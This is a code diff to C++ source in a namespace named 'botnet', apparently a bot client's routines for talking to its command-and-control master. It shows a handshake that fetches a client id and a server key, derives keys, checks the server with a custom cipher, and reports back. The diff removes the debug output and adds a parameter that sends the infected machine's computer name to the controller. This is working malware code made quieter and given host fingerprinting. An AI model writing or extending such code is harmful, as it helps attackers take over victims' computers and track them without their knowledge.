@@ -36,31 +36,25 @@ namespace botnet{
         http_client *http_c = new http_client(HOST, PORT);
         http_c->request(http_req);
 
-        std::cout << http_c->getContent() << "----------------\n";
-
         content = http_c->getContent();
-        
+
         arr = split(content, "\n");
 
         if (arr.size() < 3)
             return;
 
         client_id = base64_decode(arr[1]);
-        std::cout << "client_id base64: " << arr[1] << '\n';
-        std::cout << "client_id: " << client_id << '\n';
+
         hash_key = combineKeys(std::atoi(base64_decode(arr[2]).c_str()));
-        std::cout << "hash_key: " << hash_key << '\n';
-        std::cout << "Server Key: " << std::atoi(base64_decode(arr[2]).c_str()) << '\n';
+
         confirm_srv = arr[3];
 
         // Delete the last char because node put a \r in the end
         confirm_srv = confirm_srv.substr(0, confirm_srv.length() - 1);
-        std::cout << "confirm_srv: " << confirm_srv.length() << '\n';
-        bool b = confirm(base64_decode(confirm_srv));
 
-        std::cout << "confirm: " << (b?"sim":"nao") << '\n';
+        bool b = confirm(base64_decode(confirm_srv));
     }
-   
+
     int master_conn::keyGen() {
         SYSTEMTIME lt;
         int day = 0;
@@ -95,11 +89,10 @@ namespace botnet{
         std::string enc5 = base64_encode(reinterpret_cast<const unsigned char*>(
             enc4.c_str()), enc4.length());
 
-        return enc5;        
+        return enc5;
 	}
 
 	std::string master_conn::combineKeys(int keyServer){
-        std::cout << "std::to_string(keyServer ^ my_rand): " << std::to_string(keyServer ^ my_rand) << '\n';
         return expand_key(std::to_string(keyServer ^ my_rand));
 	}
 
@@ -122,7 +115,7 @@ namespace botnet{
     bool master_conn::confirm(std::string msg_from_server){
 		return encrypt(std::to_string(confirm_msg)) == msg_from_server;
 	}
-	
+
 	std::string master_conn::decrypt (std::string c){
 		int j = 0;
 		int i;
@@ -154,14 +147,13 @@ namespace botnet{
         count_conn++;
 
         std::string path = "?id=" + client_id;
+        path += "&compname=" + getComputerName();
 
         http_req->setPath(path);
         http_req->setHeaders(header);
 
         http_client *http_c = new http_client(HOST, PORT);
         http_c->request(http_req);
-
-        std::cout << http_c->getContent() << "----------------\n";
 
         content = http_c->getContent();
 
